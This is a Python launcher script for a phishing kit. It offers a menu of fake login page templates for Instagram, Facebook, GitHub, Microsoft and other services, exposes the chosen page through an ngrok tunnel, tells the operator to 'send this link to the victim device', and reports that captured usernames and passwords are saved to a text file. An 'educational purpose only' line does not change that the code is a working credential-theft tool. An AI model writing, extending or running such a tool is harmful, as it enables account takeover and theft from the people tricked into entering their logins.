from im import *
import os
from pyngrok import ngrok

print('This tool is for educational purpose only\n')
print('Upgraded by:git-arbaaz29\n')
print('You need to be a verified user of ngrok to use this tool')
print('Please choose from the following templates:')
def menu():
    templates = {
        '1': 'instagram',
        '2': 'Twitter',
        '3': 'facebook',
        '4': 'spotify',
        '5': 'pinterest',
        '6': 'tiktok',
        '7': 'microsoft',
        '8': 'linkedin',
        '9': 'messenger',
        '10': 'github',
        '11': 'snapchat',
    }
    number = input('Enter your choice:')
    choice = templates[number]
    print('%s' %(choice))
    checkng()
    os.remove('ngrok-stable-linux-amd64.zip')
    print("starting PHP AND NGROK SERVERS!!")
    http_tunnel = ngrok.connect()
    print("Send this link to the victim device:", http_tunnel)
    print("The credentials will be saved in" +choice+ "Folder's->Usernames.txt")
    start(choice)
menu()

